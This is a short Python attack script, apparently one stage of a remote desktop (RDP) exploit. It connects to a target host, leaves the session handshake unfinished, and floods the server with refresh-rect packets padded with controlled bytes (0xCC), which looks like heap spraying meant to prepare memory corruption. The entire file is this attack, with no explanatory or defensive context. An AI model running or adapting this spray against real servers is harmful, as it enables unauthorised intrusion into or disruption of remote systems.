#!/usr/bin/env python

from myrdp import create_rdp, default_t120_channels
import sys

host = sys.argv[1]

rdp = create_rdp(host, default_t120_channels, req_ssl=True, do_all_finalization=False)
t120_channel_id = rdp.channel_ids[4]

print('done RDP handshake without finalization steps')

pkt = rdp.create_refresh_rect_pkt([b'\xccABCDEFG']*255)
print(len(pkt))

print('spamming refresh rect')
for i in range(250):
	rdp.send(pkt*4)

input("Press Enter to continue...\n")

rdp.disconnect()
